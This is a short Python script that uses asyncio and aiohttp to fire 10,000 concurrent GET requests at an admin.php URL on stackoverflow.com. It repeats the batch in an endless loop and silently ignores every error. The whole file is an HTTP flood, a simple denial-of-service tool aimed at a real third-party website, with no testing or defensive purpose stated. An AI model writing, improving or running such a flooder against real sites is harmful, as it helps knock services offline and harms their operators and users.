import asyncio
import aiohttp 


url = "https://stackoverflow.com/admin.php?asphragus"
i = 0

async def send_req(sess):
    async with sess.get(url) as response:
        global i
        i += 1

async def main():
    async with aiohttp.ClientSession() as sess:
        tasks = []
        for _ in range(10000):
            tasks.append(send_req(sess))
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    while True:
        try:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(main())
        except:
            pass